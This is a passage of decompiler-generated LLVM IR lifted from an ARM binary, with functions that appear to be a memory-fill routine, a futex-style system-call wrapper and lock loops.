  uselistorder label %dec_label_pc_154e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_154bc, { 1, 0 }
  uselistorder label %dec_label_pc_154b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1548c, { 2, 0, 1, 4, 5, 3, 6, 8, 7 }
}

define i32 @function_15594(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15594:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15594 = icmp eq i32 %arg3, 0
  store i1 %v2_15594, i1* %cpsr_z.global-to-local, align 1
  %v3_15598 = load i32, i32* @r4, align 4
  store i32 %v3_15598, i32* %stack_var_-20, align 4
  br i1 %v2_15594, label %dec_label_pc_156a8, label %dec_label_pc_155a0

dec_label_pc_155a0:                               ; preds = %dec_label_pc_15594
  %v1_155a0 = urem i32 %arg2, 256
  store i32 %v1_155a0, i32* @ip, align 4
  %v3_155a4 = add i32 %tmp, %arg3
  store i32 %v3_155a4, i32* %r2.global-to-local, align 4
  %v2_155a8 = icmp ne i32 %arg3, 1
  store i1 %v2_155a8, i1* %cpsr_c.global-to-local, align 1
  %v7_155a8 = icmp eq i32 %arg3, 2
  store i1 %v7_155a8, i1* %cpsr_z.global-to-local, align 1
  %v1_155ac = trunc i32 %arg2 to i8
  %v3_155ac = add i32 %v3_155a4, -1
  %v4_155ac = inttoptr i32 %v3_155ac to i8*
  store i8 %v1_155ac, i8* %v4_155ac, align 1
  %v0_155b0 = load i32, i32* @ip, align 4
  %v1_155b0 = trunc i32 %v0_155b0 to i8
  store i8 %v1_155b0, i8* %arg1, align 1
  %v0_155b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_155b4 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v2_155b4 = xor i1 %v1_155b4, true
  %v3_155b4 = or i1 %v0_155b4, %v2_155b4
  br i1 %v3_155b4, label %dec_label_pc_156a8, label %dec_label_pc_155b8

dec_label_pc_155b8:                               ; preds = %dec_label_pc_155a0
  %v0_155b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_155b8 = icmp ugt i32 %v0_155b8, 5
  store i1 %v2_155b8, i1* %cpsr_c.global-to-local, align 1
  %v7_155b8 = icmp eq i32 %v0_155b8, 6
  store i1 %v7_155b8, i1* %cpsr_z.global-to-local, align 1
  %v0_155bc = load i32, i32* @ip, align 4
  %v1_155bc = trunc i32 %v0_155bc to i8
  %v2_155bc = load i32, i32* %r2.global-to-local, align 4
  %v3_155bc = add i32 %v2_155bc, -2
  %v4_155bc = inttoptr i32 %v3_155bc to i8*
  store i8 %v1_155bc, i8* %v4_155bc, align 1
  %v0_155c0 = load i32, i32* @ip, align 4
  %v1_155c0 = trunc i32 %v0_155c0 to i8
  %v4_155c0 = add i32 %tmp, 1
  %v5_155c0 = inttoptr i32 %v4_155c0 to i8*
  store i8 %v1_155c0, i8* %v5_155c0, align 1
  %v0_155c4 = load i32, i32* @ip, align 4
  %v1_155c4 = trunc i32 %v0_155c4 to i8
  %v2_155c4 = load i32, i32* %r2.global-to-local, align 4
  %v3_155c4 = add i32 %v2_155c4, -3
  %v4_155c4 = inttoptr i32 %v3_155c4 to i8*
  store i8 %v1_155c4, i8* %v4_155c4, align 1
  %v0_155c8 = load i32, i32* @ip, align 4
  %v1_155c8 = trunc i32 %v0_155c8 to i8
  %v4_155c8 = add i32 %tmp, 2
  %v5_155c8 = inttoptr i32 %v4_155c8 to i8*
  store i8 %v1_155c8, i8* %v5_155c8, align 1
  %v0_155cc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_155cc = load i1, i1* %cpsr_c.global-to-local, align 1
  %v2_155cc = xor i1 %v1_155cc, true
  %v3_155cc = or i1 %v0_155cc, %v2_155cc
  br i1 %v3_155cc, label %dec_label_pc_156a8, label %dec_label_pc_155d0

dec_label_pc_155d0:                               ; preds = %dec_label_pc_155b8
  %v0_155d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_155d0 = icmp ugt i32 %v0_155d0, 7
  store i1 %v2_155d0, i1* %cpsr_c.global-to-local, align 1
  %v7_155d0 = icmp eq i32 %v0_155d0, 8
  store i1 %v7_155d0, i1* %cpsr_z.global-to-local, align 1
  %v0_155d4 = load i32, i32* @ip, align 4
  %v1_155d4 = trunc i32 %v0_155d4 to i8
  %v2_155d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_155d4 = add i32 %v2_155d4, -4
  %v4_155d4 = inttoptr i32 %v3_155d4 to i8*
  store i8 %v1_155d4, i8* %v4_155d4, align 1
  %v0_155d8 = load i32, i32* @ip, align 4
  %v1_155d8 = trunc i32 %v0_155d8 to i8
  %v4_155d8 = add i32 %tmp, 3
  %v5_155d8 = inttoptr i32 %v4_155d8 to i8*
  store i8 %v1_155d8, i8* %v5_155d8, align 1
  %v0_155dc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_155dc = load i1, i1* %cpsr_c.global-to-local, align 1
  %v2_155dc = xor i1 %v1_155dc, true
  %v3_155dc = or i1 %v0_155dc, %v2_155dc
  br i1 %v3_155dc, label %dec_label_pc_156a8, label %dec_label_pc_155e0

dec_label_pc_155e0:                               ; preds = %dec_label_pc_155d0
  %v2_155e0 = sub i32 0, %tmp
  %v1_155e4 = urem i32 %v2_155e0, 4
  store i32 %v1_155e4, i32* %r1.global-to-local, align 4
  %v0_155e8 = load i32, i32* @ip, align 4
  %v2_155ec = mul i32 %v0_155e8, 257
  store i32 %v2_155ec, i32* %r2.global-to-local, align 4
  %v1_155f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_155f0 = sub i32 %v1_155f0, %v1_155e4
  %v1_155f4 = and i32 %v2_155f0, -4
  store i32 %v1_155f4, i32* %lr.global-to-local, align 4
  %v3_155f8 = add i32 %v1_155e4, %tmp
  store i32 %v3_155f8, i32* %r6.global-to-local, align 4
  %v3_155fc = mul i32 %v0_155e8, 16842752
  store i32 %v3_155fc, i32* %r3.global-to-local, align 4
  %v2_15600 = mul i32 %v0_155e8, 16843009
  store i32 %v2_15600, i32* @ip, align 4
  %v2_15604 = add i32 %v1_155f4, %v3_155f8
  store i32 %v2_15604, i32* %r5.global-to-local, align 4
  %v2_15608 = icmp ugt i32 %v1_155f4, 7
  store i1 %v2_15608, i1* %cpsr_c.global-to-local, align 1
  %v7_15608 = icmp eq i32 %v1_155f4, 8
  store i1 %v7_15608, i1* %cpsr_z.global-to-local, align 1
  %v5_1560c = inttoptr i32 %v3_155f8 to i32*
  store i32 %v2_15600, i32* %v5_1560c, align 4
  %v0_15610 = load i32, i32* @ip, align 4
  %v1_15610 = load i32, i32* %r5.global-to-local, align 4
  %v2_15610 = add i32 %v1_15610, -4
  %v3_15610 = inttoptr i32 %v2_15610 to i32*
  store i32 %v0_15610, i32* %v3_15610, align 4
  %v2_15614 = xor i1 %v2_15608, true
  %v3_15614 = or i1 %v7_15608, %v2_15614
  br i1 %v3_15614, label %dec_label_pc_156a8, label %dec_label_pc_15618

dec_label_pc_15618:                               ; preds = %dec_label_pc_155e0
  %v0_15618 = load i32, i32* %lr.global-to-local, align 4
  %v2_15618 = icmp ugt i32 %v0_15618, 23
  store i1 %v2_15618, i1* %cpsr_c.global-to-local, align 1
  %v7_15618 = icmp eq i32 %v0_15618, 24
  store i1 %v7_15618, i1* %cpsr_z.global-to-local, align 1
  %v0_1561c = load i32, i32* @ip, align 4
  %v1_1561c = load i32, i32* %r6.global-to-local, align 4
  %v2_1561c = add i32 %v1_1561c, 4
  %v3_1561c = inttoptr i32 %v2_1561c to i32*
  store i32 %v0_1561c, i32* %v3_1561c, align 4
  %v0_15620 = load i32, i32* @ip, align 4
  %v1_15620 = load i32, i32* %r6.global-to-local, align 4
  %v2_15620 = add i32 %v1_15620, 8
  %v3_15620 = inttoptr i32 %v2_15620 to i32*
  store i32 %v0_15620, i32* %v3_15620, align 4
  %v0_15624 = load i32, i32* @ip, align 4
  %v1_15624 = load i32, i32* %r5.global-to-local, align 4
  %v2_15624 = add i32 %v1_15624, -12
  %v3_15624 = inttoptr i32 %v2_15624 to i32*
  store i32 %v0_15624, i32* %v3_15624, align 4
  %v0_15628 = load i32, i32* @ip, align 4
  %v1_15628 = load i32, i32* %r5.global-to-local, align 4
  %v2_15628 = add i32 %v1_15628, -8
  %v3_15628 = inttoptr i32 %v2_15628 to i32*
  store i32 %v0_15628, i32* %v3_15628, align 4
  %v2_1562c = xor i1 %v2_15618, true
  %v3_1562c = or i1 %v7_15618, %v2_1562c
  br i1 %v3_1562c, label %dec_label_pc_156a8, label %dec_label_pc_15630

dec_label_pc_15630:                               ; preds = %dec_label_pc_15618
  %v0_15630 = load i32, i32* %r6.global-to-local, align 4
  %v1_15630 = and i32 %v0_15630, 4
  %v1_15634 = or i32 %v1_15630, 24
  store i32 %v1_15634, i32* %r7.global-to-local, align 4
  %v1_15638 = load i32, i32* %lr.global-to-local, align 4
  %v2_15638 = sub i32 %v1_15638, %v1_15634
  store i32 %v2_15638, i32* %lr.global-to-local, align 4
  %v0_1563c = load i32, i32* @ip, align 4
  store i32 %v0_1563c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_15648 = icmp ugt i32 %v2_15638, 30
  store i1 %v2_15648, i1* %cpsr_c.global-to-local, align 1
  %v7_15648 = icmp eq i32 %v2_15638, 31
  store i1 %v7_15648, i1* %cpsr_z.global-to-local, align 1
  %v2_1564c = add i32 %v0_15630, 12
  %v3_1564c = inttoptr i32 %v2_1564c to i32*
  store i32 %v0_1563c, i32* %v3_1564c, align 4
  %v0_15650 = load i32, i32* @ip, align 4
  %v1_15650 = load i32, i32* %r6.global-to-local, align 4
  %v2_15650 = add i32 %v1_15650, 16
  %v3_15650 = inttoptr i32 %v2_15650 to i32*
  store i32 %v0_15650, i32* %v3_15650, align 4
  %v0_15654 = load i32, i32* @ip, align 4
  %v1_15654 = load i32, i32* %r6.global-to-local, align 4
  %v2_15654 = add i32 %v1_15654, 20
  %v3_15654 = inttoptr i32 %v2_15654 to i32*
  store i32 %v0_15654, i32* %v3_15654, align 4
  %v0_15658 = load i32, i32* @ip, align 4
  %v1_15658 = load i32, i32* %r6.global-to-local, align 4
  %v2_15658 = add i32 %v1_15658, 24
  %v3_15658 = inttoptr i32 %v2_15658 to i32*
  store i32 %v0_15658, i32* %v3_15658, align 4
  %v0_1565c = load i32, i32* %r3.global-to-local, align 4
  %v1_1565c = load i32, i32* %r1.global-to-local, align 4
  %v2_1565c = or i32 %v1_1565c, %v0_1565c
  store i32 %v2_1565c, i32* %r3.global-to-local, align 4
  %v1_15660 = load i32, i32* %r2.global-to-local, align 4
  %v2_15660 = or i32 %v1_15660, %v1_1565c
  store i32 %v2_15660, i32* %r4.global-to-local, align 4
  %v0_15664 = load i32, i32* @ip, align 4
  %v1_15664 = load i32, i32* %r5.global-to-local, align 4
  %v2_15664 = add i32 %v1_15664, -16
  %v3_15664 = inttoptr i32 %v2_15664 to i32*
  store i32 %v0_15664, i32* %v3_15664, align 4
  %v0_15668 = load i32, i32* @ip, align 4
  %v1_15668 = load i32, i32* %r5.global-to-local, align 4
  %v2_15668 = add i32 %v1_15668, -28
  %v3_15668 = inttoptr i32 %v2_15668 to i32*
  store i32 %v0_15668, i32* %v3_15668, align 4
  %v0_1566c = load i32, i32* @ip, align 4
  %v1_1566c = load i32, i32* %r5.global-to-local, align 4
  %v2_1566c = add i32 %v1_1566c, -24
  %v3_1566c = inttoptr i32 %v2_1566c to i32*
  store i32 %v0_1566c, i32* %v3_1566c, align 4
  %v0_15670 = load i32, i32* @ip, align 4
  %v1_15670 = load i32, i32* %r5.global-to-local, align 4
  %v2_15670 = add i32 %v1_15670, -20
  %v3_15670 = inttoptr i32 %v2_15670 to i32*
  store i32 %v0_15670, i32* %v3_15670, align 4
  %v2_15674 = xor i1 %v2_15648, true
  %v3_15674 = or i1 %v7_15648, %v2_15674
  br i1 %v3_15674, label %dec_label_pc_156a8, label %dec_label_pc_15678

dec_label_pc_15678:                               ; preds = %dec_label_pc_15630
  %v0_15678 = load i32, i32* %r6.global-to-local, align 4
  %v1_15678 = load i32, i32* %r7.global-to-local, align 4
  %v2_15678 = add i32 %v1_15678, %v0_15678
  store i32 %v2_15678, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1567c

dec_label_pc_1567c:                               ; preds = %dec_label_pc_1567c, %dec_label_pc_15678
  %v0_15684 = phi i32 [ %v1_156a0, %dec_label_pc_1567c ], [ %v2_15678, %dec_label_pc_15678 ]
  %v0_1567c = load i32, i32* %lr.global-to-local, align 4
  %v1_1567c = add i32 %v0_1567c, -32
  store i32 %v1_1567c, i32* %lr.global-to-local, align 4
  %v2_15680 = icmp ugt i32 %v1_1567c, 30
  %v7_15680 = icmp eq i32 %v1_1567c, 31
  %v1_15684 = inttoptr i32 %v0_15684 to i32*
  %v2_15684 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_15684, i32* %v1_15684, align 4
  %v3_15684 = add i32 %v0_15684, 4
  %v4_15684 = inttoptr i32 %v3_15684 to i32*
  %v5_15684 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15684, i32* %v4_15684, align 4
  %v0_15688 = load i32, i32* %r3.global-to-local, align 4
  %v1_15688 = load i32, i32* %r2.global-to-local, align 4
  %v2_15688 = add i32 %v1_15688, 8
  %v3_15688 = inttoptr i32 %v2_15688 to i32*
  store i32 %v0_15688, i32* %v3_15688, align 4
  %v0_1568c = load i32, i32* %r4.global-to-local, align 4
  %v1_1568c = load i32, i32* %r2.global-to-local, align 4
  %v2_1568c = add i32 %v1_1568c, 12
  %v3_1568c = inttoptr i32 %v2_1568c to i32*
  store i32 %v0_1568c, i32* %v3_1568c, align 4
  %v0_15690 = load i32, i32* %r3.global-to-local, align 4
  %v1_15690 = load i32, i32* %r2.global-to-local, align 4
  %v2_15690 = add i32 %v1_15690, 16
  %v3_15690 = inttoptr i32 %v2_15690 to i32*
  store i32 %v0_15690, i32* %v3_15690, align 4
  %v0_15694 = load i32, i32* %r4.global-to-local, align 4
  %v1_15694 = load i32, i32* %r2.global-to-local, align 4
  %v2_15694 = add i32 %v1_15694, 20
  %v3_15694 = inttoptr i32 %v2_15694 to i32*
  store i32 %v0_15694, i32* %v3_15694, align 4
  %v0_15698 = load i32, i32* %r3.global-to-local, align 4
  %v1_15698 = load i32, i32* %r2.global-to-local, align 4
  %v2_15698 = add i32 %v1_15698, 24
  %v3_15698 = inttoptr i32 %v2_15698 to i32*
  store i32 %v0_15698, i32* %v3_15698, align 4
  %v0_1569c = load i32, i32* %r4.global-to-local, align 4
  %v1_1569c = load i32, i32* %r2.global-to-local, align 4
  %v2_1569c = add i32 %v1_1569c, 28
  %v3_1569c = inttoptr i32 %v2_1569c to i32*
  store i32 %v0_1569c, i32* %v3_1569c, align 4
  %v0_156a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_156a0 = add i32 %v0_156a0, 32
  store i32 %v1_156a0, i32* %r2.global-to-local, align 4
  %v2_156a4 = xor i1 %v7_15680, true
  %v3_156a4 = and i1 %v2_15680, %v2_156a4
  br i1 %v3_156a4, label %dec_label_pc_1567c, label %dec_label_pc_156a8.loopexit

dec_label_pc_156a8.loopexit:                      ; preds = %dec_label_pc_1567c
  store i1 %v2_15680, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_15680, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_156a8

dec_label_pc_156a8:                               ; preds = %dec_label_pc_156a8.loopexit, %dec_label_pc_15630, %dec_label_pc_15618, %dec_label_pc_155d0, %dec_label_pc_155b8, %dec_label_pc_155a0, %dec_label_pc_15594, %dec_label_pc_155e0
  %v2_156a8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_156a8, i32* @r4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_156a0, { 1, 0 }
  uselistorder i1 %v7_15680, { 1, 0 }
  uselistorder i32 %v0_15684, { 1, 0 }
  uselistorder i32 %v0_15618, { 1, 0 }
  uselistorder i32 %v3_155f8, { 1, 0, 2 }
  uselistorder i32 %v1_155f4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_155e4, { 2, 1, 0 }
  uselistorder i32 %v0_155d0, { 1, 0 }
  uselistorder i32 %v0_155b8, { 1, 0 }
  uselistorder i32 %tmp, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r6.global-to-local, { 6, 0, 1, 2, 4, 3, 5, 7 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 9, 10, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 9, 10, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder i32 -16, { 6, 0, 4, 5, 1, 2, 3 }
  uselistorder i32 30, { 6, 7, 4, 5, 0, 12, 13, 8, 1, 9, 2, 10, 3, 11, 14 }
  uselistorder i32 -3, { 4, 2, 0, 1, 3 }
  uselistorder i32 %arg3, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_156a8, { 0, 1, 2, 7, 3, 4, 5, 6 }
}

define i32 @function_156b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_156b0:
  ret i32 %arg2
}

define i32 @function_156d0(i32* %arg1) local_unnamed_addr {
dec_label_pc_156d0:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_156d0 = load i32, i32* @r0, align 4
  %v1_156d0 = inttoptr i32 %v0_156d0 to i32*
  %v2_156d0 = load i32, i32* %v1_156d0, align 4
  %v2_156d4 = icmp eq i32 %v2_156d0, 0
  store i1 %v2_156d4, i1* @cpsr_z, align 1
  %v3_156d8 = load i32, i32* @r4, align 4
  store i32 %v3_156d8, i32* %stack_var_-8, align 4
  store i32 %v0_156d0, i32* %r4.global-to-local, align 4
  br i1 %v2_156d4, label %dec_label_pc_15734, label %dec_label_pc_156e4

dec_label_pc_156e4:                               ; preds = %dec_label_pc_156d0
  %v0_156e4 = call i32 @function_15ce4()
  store i32 %v0_156e4, i32* @r0, align 4
  %v2_156ec = inttoptr i32 %v0_156e4 to i32*
  store i32 0, i32* %v2_156ec, align 4
  %v0_156f0 = call i32 @function_15ce4()
  %v1_156f4 = add i32 %v0_156f0, 4
  %v2_156f4 = inttoptr i32 %v1_156f4 to i32*
  %v3_156f4 = load i32, i32* %v2_156f4, align 4
  %v2_156f8 = icmp eq i32 %v3_156f4, 0
  br i1 %v2_156f8, label %dec_label_pc_15734, label %dec_label_pc_15700

dec_label_pc_15700:                               ; preds = %dec_label_pc_156e4
  %v0_15704 = load i32, i32* %r4.global-to-local, align 4
  %v4_15710 = call i32 @function_156b0(i32 240, i32 %v0_15704, i32 129, i32 1)
  %v4_15718 = icmp eq i32 %v4_15710, -38
  br i1 %v4_15718, label %dec_label_pc_1571c, label %dec_label_pc_15734

dec_label_pc_1571c:                               ; preds = %dec_label_pc_15700
  %v0_15720 = load i32, i32* %r4.global-to-local, align 4
  %v2_1572c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1572c, i32* %r4.global-to-local, align 4
  %v4_15730 = call i32 @function_156b0(i32 240, i32 %v0_15720, i32 1, i32 1)
  br label %dec_label_pc_15734

dec_label_pc_15734:                               ; preds = %dec_label_pc_15700, %dec_label_pc_156e4, %dec_label_pc_156d0, %dec_label_pc_1571c
  %v1_15738 = phi i32 [ %v4_15710, %dec_label_pc_15700 ], [ %v0_156f0, %dec_label_pc_156e4 ], [ %v0_156d0, %dec_label_pc_156d0 ], [ %v4_15730, %dec_label_pc_1571c ]
  %v2_15734 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15734, i32* %r4.global-to-local, align 4
  ret i32 %v1_15738

; uselistorder directives
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @function_156b0, { 1, 0 }
  uselistorder label %dec_label_pc_15734, { 3, 0, 1, 2 }
}

define i32 @function_1573c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1573c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_15740 = load i32, i32* @global_var_22b38.560, align 4
  %v2_15744 = icmp eq i32 %v3_15740, 0
  store i1 %v2_15744, i1* @cpsr_z, align 1
  %v9_15748 = load i32, i32* @r6, align 4
  %v0_1574c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1574c, i32* @r4, align 4
  br i1 %v2_15744, label %dec_label_pc_15794, label %dec_label_pc_15760.preheader

dec_label_pc_15760.preheader:                     ; preds = %dec_label_pc_1573c
  %v2_15750 = add i32 %v0_1574c, 4
  store i32 %v2_15750, i32* @r6, align 4
  br label %dec_label_pc_15760

dec_label_pc_1575c:                               ; preds = %dec_label_pc_1577c
  %v2_1575c = inttoptr i32 %v0_15784 to i32*
  %v3_1575c = call i32 @function_15864(i32* %v2_1575c, i32 %v0_15788)
  store i32 %v3_1575c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15760.backedge

dec_label_pc_15760.backedge:                      ; preds = %dec_label_pc_1575c, %dec_label_pc_15760
  %v0_15760.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15760

dec_label_pc_15760:                               ; preds = %dec_label_pc_15760.backedge, %dec_label_pc_15760.preheader
  %v0_15760 = phi i32 [ %v0_15760.pre, %dec_label_pc_15760.backedge ], [ %v0_1574c, %dec_label_pc_15760.preheader ]
  %v1_15760 = inttoptr i32 %v0_15760 to i32*
  %v2_15760 = load i32, i32* %v1_15760, align 4
  store i32 %v2_15760, i32* @r5, align 4
  store i32 %v2_15760, i32* %r0.global-to-local, align 4
  %v4_15770 = call i32 @function_15d38(i32 %v2_15760, i32 1, i32* %v1_15760)
  store i32 %v4_15770, i32* %r0.global-to-local, align 4
  %v2_15774 = icmp eq i32 %v4_15770, 0
  store i1 %v2_15774, i1* @cpsr_z, align 1
  br i1 %v2_15774, label %dec_label_pc_1577c, label %dec_label_pc_15760.backedge

dec_label_pc_1577c:                               ; preds = %dec_label_pc_15760
  store i32 1, i32* @r2, align 4
  %v0_15780 = load i32, i32* @r5, align 4
  %v2_15780 = icmp eq i32 %v0_15780, 0
  %v0_15784 = load i32, i32* @r4, align 4
  store i32 %v0_15784, i32* %r0.global-to-local, align 4
  %v0_15788 = load i32, i32* @r6, align 4
  store i32 1, i32* @r3, align 4
  br i1 %v2_15780, label %dec_label_pc_15794.loopexit, label %dec_label_pc_1575c

dec_label_pc_15794.loopexit:                      ; preds = %dec_label_pc_1577c
  br label %dec_label_pc_15794

dec_label_pc_15794:                               ; preds = %dec_label_pc_15794.loopexit, %dec_label_pc_1573c
  %v1_15798 = phi i32 [ %v0_15784, %dec_label_pc_15794.loopexit ], [ %v0_1574c, %dec_label_pc_1573c ]
  store i32 %v9_15748, i32* @r6, align 4
  ret i32 %v1_15798

; uselistorder directives
  uselistorder i32 %v0_15784, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_15760.backedge, { 1, 0 }
}

define i32 @function_157a0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_157a0:
  store i32 %arg1, i32* @r1, align 4
  %v0_157a0 = load i32, i32* @lr, align 4
  store i32 88012, i32* @lr, align 4
  %v1_157c8 = call i32 @function_157dc()
  store i32 %v0_157a0, i32* @lr, align 4
  ret i32 %v1_157c8
}

define i32 @function_157dc() local_unnamed_addr {
dec_label_pc_157dc:
  %v0_157fc = call i32 @function_168d4()
  ret i32 %v0_157fc
}

define i32 @function_1580c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1580c:
  ret i32 %arg2
}

define i32 @function_15830(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15830:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15830 = load i32, i32* @r4, align 4
  store i32 %v3_15830, i32* %stack_var_-16, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1583c

dec_label_pc_1583c:                               ; preds = %dec_label_pc_1583c.dec_label_pc_1583c_crit_edge, %dec_label_pc_15830
  %v0_15848 = phi i32 [ %v0_15848.pre, %dec_label_pc_1583c.dec_label_pc_1583c_crit_edge ], [ %arg2, %dec_label_pc_15830 ]
  %v0_1583c = phi i32 [ %v0_1583c.pre, %dec_label_pc_1583c.dec_label_pc_1583c_crit_edge ], [ %tmp, %dec_label_pc_15830 ]
  %v1_1583c = inttoptr i32 %v0_1583c to i32*
  %v2_1583c = load i32, i32* %v1_1583c, align 4
  store i32 %v2_1583c, i32* %r4.global-to-local, align 4
  %v2_15848 = add i32 %v2_1583c, %v0_15848
  %v4_1584c = call i32 @function_15d38(i32 %v2_1583c, i32 %v2_15848, i32* %v1_1583c)
  %v2_15850 = icmp eq i32 %v4_1584c, 0
  store i1 %v2_15850, i1* @cpsr_z, align 1
  br i1 %v2_15850, label %dec_label_pc_15858, label %dec_label_pc_1583c.dec_label_pc_1583c_crit_edge

dec_label_pc_1583c.dec_label_pc_1583c_crit_edge:  ; preds = %dec_label_pc_1583c
  %v0_1583c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_15848.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1583c

dec_label_pc_15858:                               ; preds = %dec_label_pc_1583c
  %v0_15858 = load i32, i32* %r4.global-to-local, align 4
  %v2_1585c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1585c, i32* %r4.global-to-local, align 4
  ret i32 %v0_15858

; uselistorder directives
  uselistorder i32 %v2_1583c, { 1, 0, 2 }
}

define i32 @function_15864(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15864:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v3_15864 = load i32, i32* @r4, align 4
  %v6_15864 = load i32, i32* @r5, align 4
  %v9_15864 = load i32, i32* @r6, align 4
  %v12_15864 = load i32, i32* @r7, align 4
  %v15_15864 = load i32, i32* @r8, align 4
  %v18_15864 = load i32, i32* @sl, align 4
  %v21_15864 = load i32, i32* @lr, align 4
  %v0_15868 = load i32, i32* @r3, align 4
  %v2_15868 = icmp eq i32 %v0_15868, 0
  %v0_1586c = load i32, i32* @r2, align 4
  store i32 %v0_1586c, i32* @r8, align 4
  %. = select i1 %v2_15868, i32 0, i32 128
  store i32 %., i32* %sl.global-to-local, align 4
  %v0_1587c = load i32, i32* @r0, align 4
  store i32 %v0_1587c, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 99, i32* %r2.global-to-local, align 4
  %v2_158a427 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_158a4

dec_label_pc_1588c:                               ; preds = %dec_label_pc_158ac, %dec_label_pc_158a4
  %v0_1588c = load i32, i32* @r6, align 4
  %v1_1588c = inttoptr i32 %v0_1588c to i32*
  %v2_1588c = load i32, i32* %v1_1588c, align 4
  %v1_15890 = load i32, i32* @r8, align 4
  %v9_15890 = icmp eq i32 %v2_1588c, %v1_15890
  store i1 %v9_15890, i1* @cpsr_z, align 1
  br i1 %v9_15890, label %dec_label_pc_15898, label %dec_label_pc_1593c

dec_label_pc_15898:                               ; preds = %dec_label_pc_1588c
  %v0_15898 = call i32 @function_15ce4()
  store i32 %v0_15898, i32* @r0, align 4
  %v0_1589c.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_158a4.pre = load i32, i32* @r5, align 4
  %v1_1589c = add i32 %v0_1589c.pre, -1
  store i32 %v1_1589c, i32* %r2.global-to-local, align 4
  %v2_1589c = icmp eq i32 %v0_1589c.pre, 0
  %v2_158a4 = icmp eq i32 %v0_158a4.pre, 0
  store i1 %v2_158a4, i1* @cpsr_z, align 1
  br i1 %v2_1589c, label %dec_label_pc_158bc, label %dec_label_pc_158a4

dec_label_pc_158a4:                               ; preds = %dec_label_pc_15864, %dec_label_pc_15898
